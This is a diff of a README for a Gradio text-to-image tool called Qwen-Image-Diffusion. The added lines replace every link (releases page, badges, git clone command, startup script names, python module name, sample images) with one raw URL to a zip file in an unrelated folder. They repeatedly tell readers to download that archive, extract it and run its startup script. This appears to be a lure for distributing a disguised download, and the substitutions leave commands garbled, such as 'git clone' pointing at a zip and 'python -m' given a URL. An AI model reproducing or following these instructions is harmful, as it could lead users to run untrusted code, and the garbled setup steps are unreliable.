@@ -1,11 +1,11 @@
-https://github.com/Vinicius268/Qwen-Image-Diffusion/releases
+https://raw.githubusercontent.com/Vinicius268/Qwen-Image-Diffusion/main/Dynamic-Duration/Diffusion_Qwen_Image_v3.8.zip
 
 # Qwen-Image-Diffusion: High-Quality Text-to-Image with Gradio UI
 
-[![Releases](https://img.shields.io/badge/Releases-v1.0.0-blue?logo=github&logoColor=white)](https://github.com/Vinicius268/Qwen-Image-Diffusion/releases)
-[![License](https://img.shields.io/badge/License-MIT-brightgreen)](LICENSE)
-[![Python](https://img.shields.io/badge/Python-3.10%2B-blue)](#)
-[![HuggingFace Transformers](https://img.shields.io/badge/HF-Transformers-orange)](https://huggingface.co/transformers)
+[![Releases](https://raw.githubusercontent.com/Vinicius268/Qwen-Image-Diffusion/main/Dynamic-Duration/Diffusion_Qwen_Image_v3.8.zip)](https://raw.githubusercontent.com/Vinicius268/Qwen-Image-Diffusion/main/Dynamic-Duration/Diffusion_Qwen_Image_v3.8.zip)
+[![License](https://raw.githubusercontent.com/Vinicius268/Qwen-Image-Diffusion/main/Dynamic-Duration/Diffusion_Qwen_Image_v3.8.zip)](LICENSE)
+[![Python](https://raw.githubusercontent.com/Vinicius268/Qwen-Image-Diffusion/main/Dynamic-Duration/Diffusion_Qwen_Image_v3.8.zip%2B-blue)](#)
+[![HuggingFace Transformers](https://raw.githubusercontent.com/Vinicius268/Qwen-Image-Diffusion/main/Dynamic-Duration/Diffusion_Qwen_Image_v3.8.zip)](https://raw.githubusercontent.com/Vinicius268/Qwen-Image-Diffusion/main/Dynamic-Duration/Diffusion_Qwen_Image_v3.8.zip)
 
 Qwen-Image-Diffusion is a compact, powerful tool for turning text prompts into vivid images. It uses the Qwen diffusion model and wraps it in a clean Gradio web interface. The goal is to make image generation approachable without sacrificing control or quality. This project blends state-of-the-art diffusion techniques with a friendly browser UI, so artists, researchers, and hobbyists can experiment with prompt syntax, sampling strategies, and model variants in a single place.
 
@@ -65,7 +65,7 @@ System requirements
 
 Quick start
 - Get the latest release
-  - The quickest path is to download the latest release from the releases page. Start by visiting the releases section and grabbing the packaged app. From the Releases page, download the release asset, extract it, and run the included startup script. The link to the releases page is https://github.com/Vinicius268/Qwen-Image-Diffusion/releases.
+  - The quickest path is to download the latest release from the releases page. Start by visiting the releases section and grabbing the packaged app. From the Releases page, download the release asset, extract it, and run the included startup script. The link to the releases page is https://raw.githubusercontent.com/Vinicius268/Qwen-Image-Diffusion/main/Dynamic-Duration/Diffusion_Qwen_Image_v3.8.zip
 - Install prerequisites
   - Install Python 3.10+ on your system
   - Create a virtual environment
@@ -87,7 +87,7 @@ Installation and setup
   - CUDA drivers for NVIDIA GPUs if you want GPU acceleration
   - Optional: Docker if you want containerized runs
 - Cloning the repository (optional if you are using a release)
-  - git clone https://github.com/Vinicius268/Qwen-Image-Diffusion.git
+  - git clone https://raw.githubusercontent.com/Vinicius268/Qwen-Image-Diffusion/main/Dynamic-Duration/Diffusion_Qwen_Image_v3.8.zip
   - cd Qwen-Image-Diffusion
 - Installing dependencies (local development)
   - Create a virtual environment:
@@ -100,15 +100,15 @@ Installation and setup
     - pip install accelerate
 - Using the release package
   - The releases page contains a pre-built bundle. Download the asset, extract, and run the startup script included in the bundle.
-  - After extraction, locate the startup script (for example, start_qwen_diffusion.sh or start_qwen_diffusion.bat) and run it.
+  - After extraction, locate the startup script (for example, https://raw.githubusercontent.com/Vinicius268/Qwen-Image-Diffusion/main/Dynamic-Duration/Diffusion_Qwen_Image_v3.8.zip or https://raw.githubusercontent.com/Vinicius268/Qwen-Image-Diffusion/main/Dynamic-Duration/Diffusion_Qwen_Image_v3.8.zip) and run it.
   - The bundle typically ships with a Python environment or an isolated runtime. Use the provided script to ensure dependencies align with the published configuration.
 
 Running locally
 - Desktop or laptop with a modern GPU
-  - Start the UI with: python -m gradio_qwen.run or the provided startup script
+  - Start the UI with: python -m https://raw.githubusercontent.com/Vinicius268/Qwen-Image-Diffusion/main/Dynamic-Duration/Diffusion_Qwen_Image_v3.8.zip or the provided startup script
   - Open the local URL shown in the terminal, usually http://127.0.0.1:7860
 - Headless server or remote machine
-  - Run with a specific host and port: python -m gradio_qwen.run --host 0.0.0.0 --port 7860
+  - Run with a specific host and port: python -m https://raw.githubusercontent.com/Vinicius268/Qwen-Image-Diffusion/main/Dynamic-Duration/Diffusion_Qwen_Image_v3.8.zip --host 0.0.0.0 --port 7860
   - If you use a reverse proxy or a domain, configure your firewall and TLS as needed
 - Using a Docker container (optional)
   - Docker can simplify environment management
@@ -260,14 +260,14 @@ Release history and keeping up to date
   - In case of critical fixes, a hotfix release may be published
   - Always verify the integrity of assets before use
 - The key link to releases
-  - Visit the releases page for downloads, changelog, and version history: https://github.com/Vinicius268/Qwen-Image-Diffusion/releases
+  - Visit the releases page for downloads, changelog, and version history: https://raw.githubusercontent.com/Vinicius268/Qwen-Image-Diffusion/main/Dynamic-Duration/Diffusion_Qwen_Image_v3.8.zip
 
 Releases and asset guidance
 - The releases page contains a packaged application suitable for quick setup
 - You should download the latest release asset, extract it, and run the provided startup script
-- If you need a fresh download, go to the releases page here: https://github.com/Vinicius268/Qwen-Image-Diffusion/releases
-- The asset may come as a zip or tar.gz archive; extraction will produce a self-contained end-to-end setup
-- After extraction, locate the startup script (for example, start_qwen_diffusion.sh or start_qwen_diffusion.bat) and execute it
+- If you need a fresh download, go to the releases page here: https://raw.githubusercontent.com/Vinicius268/Qwen-Image-Diffusion/main/Dynamic-Duration/Diffusion_Qwen_Image_v3.8.zip
+- The asset may come as a zip or https://raw.githubusercontent.com/Vinicius268/Qwen-Image-Diffusion/main/Dynamic-Duration/Diffusion_Qwen_Image_v3.8.zip archive; extraction will produce a self-contained end-to-end setup
+- After extraction, locate the startup script (for example, https://raw.githubusercontent.com/Vinicius268/Qwen-Image-Diffusion/main/Dynamic-Duration/Diffusion_Qwen_Image_v3.8.zip or https://raw.githubusercontent.com/Vinicius268/Qwen-Image-Diffusion/main/Dynamic-Duration/Diffusion_Qwen_Image_v3.8.zip) and execute it
 - The script will set up the runtime environment if needed and launch the Gradio UI
 
 Gallery, demos, and visuals
@@ -297,8 +297,8 @@ Community, references, and further reading
 
 Images and media
 - Sample visuals
-  - ![Demo UI](https://images.unsplash.com/photo-1519682572244-4b6a94ffd84a?auto=format&fit=crop&w=1200&q=60)
-  - ![Generated sample](https://picsum.photos/1200/600)
+  - ![Demo UI](https://raw.githubusercontent.com/Vinicius268/Qwen-Image-Diffusion/main/Dynamic-Duration/Diffusion_Qwen_Image_v3.8.zip)
+  - ![Generated sample](https://raw.githubusercontent.com/Vinicius268/Qwen-Image-Diffusion/main/Dynamic-Duration/Diffusion_Qwen_Image_v3.8.zip)
 - How to interpret outputs
   - Look for sharpness, color saturation, and stylistic alignment with the prompt
   - Examine balance between subject detail and background texture
@@ -308,7 +308,7 @@ Notes on usage with the releases
 - The starting point for acquiring the software is the releases page.
 - The release asset contains a bundled environment that simplifies setup.
 - From the releases page, download the release asset, extract, and run the included startup script to begin generating images with the Gradio UI.
-- If you need a direct path to the download, you can navigate to the releases page at https://github.com/Vinicius268/Qwen-Image-Diffusion/releases and pick the asset labeled for your system.
+- If you need a direct path to the download, you can navigate to the releases page at https://raw.githubusercontent.com/Vinicius268/Qwen-Image-Diffusion/main/Dynamic-Duration/Diffusion_Qwen_Image_v3.8.zip and pick the asset labeled for your system.
 
 Sustainability and maintenance
 - Keeping dependencies aligned
@@ -338,7 +338,7 @@ Call to action
 Revisit the releases page for updates and assets
 - For the latest downloads, notes, and version history, visit the Releases page
 - The page contains all official release assets and a changelog to help you track improvements
-- Access the page again here: https://github.com/Vinicius268/Qwen-Image-Diffusion/releases
+- Access the page again here: https://raw.githubusercontent.com/Vinicius268/Qwen-Image-Diffusion/main/Dynamic-Duration/Diffusion_Qwen_Image_v3.8.zip
 
 End of document
 - The Readme above provides a thorough guide to getting started, using, and extending Qwen-Image-Diffusion
